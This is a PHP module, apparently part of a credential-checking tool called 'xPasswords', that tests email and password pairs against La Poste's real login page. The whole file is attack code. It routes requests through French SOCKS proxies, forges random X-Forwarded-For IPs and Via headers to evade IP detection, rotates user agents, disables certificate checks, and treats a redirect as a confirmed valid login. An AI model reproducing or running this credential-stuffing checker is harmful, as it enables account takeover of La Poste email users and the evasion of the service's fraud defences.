<?php
namespace xPasswords\Providers;

class LaPoste {
    
    static public $imapAddress = 'imaps://imap.laposte.net:993';
    
    static public function authenticate($email, $password) {
                
        // Shared options
        $staticOptions = [
            'UserAgent' => \xPasswords\Core::getUserAgent(),
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];
        
        // Use LaPoste login
        $request = \Requests::post('https://compte.laposte.net/login.do', [
            // Try to spoof and make the IP detection more complex
            'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Origin' => 'http://www.laposte.net',
        ], [
            'login' => $email,
            'password' => $password,
        ], [
            'timeout' => 60, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);

        switch($request->status_code) {
            
            case 302: // Authorized
            return true;
            break;

            case 200: // Unauthorized
            return false;
            break;

            default:
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] LaPoste returned anormal HTTP code: ' . $request->status_code . ' for ' . $email, ['color' => 'red']);
            break;
        }
        
        return false;
    }
};